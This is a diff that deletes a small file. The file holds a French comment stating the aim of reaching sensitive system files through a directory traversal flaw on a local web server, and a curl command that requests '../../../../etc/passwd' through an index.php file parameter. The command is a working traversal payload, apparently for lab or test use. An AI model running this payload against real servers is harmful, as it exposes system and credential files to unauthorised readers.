@@ -1,3 +1,0 @@
-# Objectif : Tenter d'accéder à des fichiers sensibles du système d'exploitation via une faille de type Directory Traversal sur le serveur web local.
-
-curl "http://127.0.0.1/index.php?file=../../../../etc/passwd"
